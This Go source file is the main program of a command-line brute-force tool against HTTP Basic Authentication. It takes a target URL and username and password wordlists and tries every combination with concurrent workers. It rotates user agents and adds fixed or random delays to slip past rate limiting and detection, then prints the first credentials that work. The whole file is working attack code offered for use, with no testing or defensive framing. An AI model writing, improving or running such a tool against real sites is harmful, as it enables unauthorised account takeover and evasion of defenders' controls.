// main.go

package main

import (
	"BasicAuthBruteForce/pkg"
	"fmt"
	"github.com/TwiN/go-color"
	"github.com/urfave/cli/v2"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

// Global variables for command-line flags and other settings
var rate int
var randomagent, randomdelay bool
var url, username, password string
var start time.Time
var delay int

// Function to handle parsing errors
func errorpars(err error) {
	if err != nil {
		log.Panic(err.Error())
	}
}

// main function
func main() {
	start = time.Now()
	runtime.GOMAXPROCS(1)
	// Command-line interface setup using urfave/cli
	app := &cli.App{
		Flags: []cli.Flag{
			// Flags for URL, username, password, rate limit, delay, and other options
			// Each flag has a corresponding destination variable to store the value
			&cli.StringFlag{
				Name:        "url",
				Value:       "",
				Aliases:     []string{"d"},
				Destination: &url,
				Usage:       "Enter Site URL",
			},
			&cli.StringFlag{
				Name:        "username",
				Value:       "",
				Aliases:     []string{"u"},
				Destination: &username,
				Usage:       "Enter Username Wordlist",
			},
			&cli.StringFlag{
				Name:        "password",
				Value:       "",
				Aliases:     []string{"p"},
				Destination: &password,
				Usage:       "Enter Password Wordlist",
			},
			&cli.IntFlag{
				Name:        "rate",
				Aliases:     []string{"r"},
				Value:       1,
				Usage:       "rate limit",
				Destination: &rate,
			},
			&cli.IntFlag{
				Name:        "delay",
				Aliases:     []string{"e"},
				Value:       0,
				Usage:       "delay per second",
				Destination: &delay,
			},
			&cli.BoolFlag{
				Name:        "random-agent",
				Aliases:     []string{"a"},
				Value:       false,
				Usage:       "Random Agent",
				Destination: &randomagent,
			},
			&cli.BoolFlag{
				Name:        "random-delay",
				Aliases:     []string{"y"},
				Value:       false,
				Usage:       "Random Delay",
				Destination: &randomdelay,
			},
		},
		Action: func(cCtx *cli.Context) error {
			// Switch case to handle different scenarios based on provided options
			switch {
			case cCtx.String("url") == "":
				fmt.Println(color.Colorize(color.Red, "[-] Please Enter URL with -d"))
			case cCtx.String("username") == "":
				fmt.Println(color.Colorize(color.Red, "[-] Please Enter Username Wordlist Address with -u"))
			case cCtx.String("username") == "":
				fmt.Println(color.Colorize(color.Red, "[-] Please Enter Username Wordlist Address with -u"))
			case cCtx.Bool("random-agent") == true:
				fmt.Println(color.Colorize(color.Green, "[-] We Set Random User Agent For you"))
			}
			return nil
		},
	}
	// Run the CLI app
	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}
	// Open username and password wordlist files
	usernamedic, err := os.OpenFile(username, os.O_RDONLY, 0600)
	errorpars(err)
	defer func(usernamedic *os.File) {
		err := usernamedic.Close()
		errorpars(err)
	}(usernamedic)

	passwordsdic, err := os.OpenFile(password, os.O_RDONLY, 0600)
	errorpars(err)
	defer func(passwordsdic *os.File) {
		err := passwordsdic.Close()
		errorpars(err)
	}(passwordsdic)
	// Read content of wordlist files
	usernamedicbyte, err := ioutil.ReadAll(usernamedic)
	passwordsdicbyte, err := ioutil.ReadAll(passwordsdic)
	linesuser := strings.Split(string(usernamedicbyte), "\r\n")
	linespassw := strings.Split(string(passwordsdicbyte), "\n")

	var wg sync.WaitGroup
	jobs := make(chan string, len(linesuser)*len(linespassw))
	results := make(chan struct {
		user string
		pass string
	}, len(linesuser)*len(linespassw))
	// Check for conflicting options regarding delay
	if delay != 0 && randomdelay {
		log.Println(color.Colorize(color.Red, "[-] Choose one --delay or --random-delay"))
		os.Exit(1)
	}
	// Create worker goroutines
	for i := 0; i < rate; i++ {

		wg.Add(1)
		go workerRoutine(jobs, results, &wg)
	}

	// Add jobs to the queue
	for _, usern := range linesuser {
		for _, passw := range linespassw {
			jobs <- fmt.Sprintf("%s:%s", usern, passw)
		}
	}
	close(jobs)

	// Wait for all workers to finish
	go func() {
		wg.Wait()
		close(results)
	}()

	// Process results
	for res := range results {
		fmt.Printf(color.Colorize(color.Red, "[+] Find Username: %s And Password : %s\n"), res.user, res.pass)
		elapsed := time.Since(start)
		fmt.Printf("page took %s \n", elapsed)
		os.Exit(1)
	}

}

// Variables for workerRoutine
var j int
var Useragent string

// workerRoutine function to perform the actual brute-force attacks
func workerRoutine(jobs <-chan string, results chan<- struct{ user, pass string }, wg *sync.WaitGroup) {
	defer wg.Done()
	client := BasicAuthBruteForce.NewClient()

	for job := range jobs {
		j++
		// Change User Agent after every 10 attempts
		if j == 10 {
			//make user agent
			Useragent = BasicAuthBruteForce.Useragent(randomagent)
			//	fmt.Printf(color.Colorize(color.Green, "-*- User Agent Changed to: \n %s -*- \n"), Useragent)
			j = 0
		}
		// Split the job into username and password
		userpass := strings.Split(job, ":")
		user, pass := userpass[0], userpass[1]
		// Set headers using the client
		err := client.SetHeader(url, Useragent, user, pass)
		// If the error is true, it means authentication was successful
		if err {
			results <- struct{ user, pass string }{user, pass}
		}
		//check if delay set sleep with delay input
		if delay != 0 {

			time.Sleep(time.Duration(delay) * time.Second)
		}
		// Sleep with a random delay if randomdelay is set
		if randomdelay {

			rand.Seed(time.Now().UnixNano())
			randomNumber := rand.Intn(10) + 1

			time.Sleep(time.Duration(randomNumber) * time.Second)

		}

	}
}
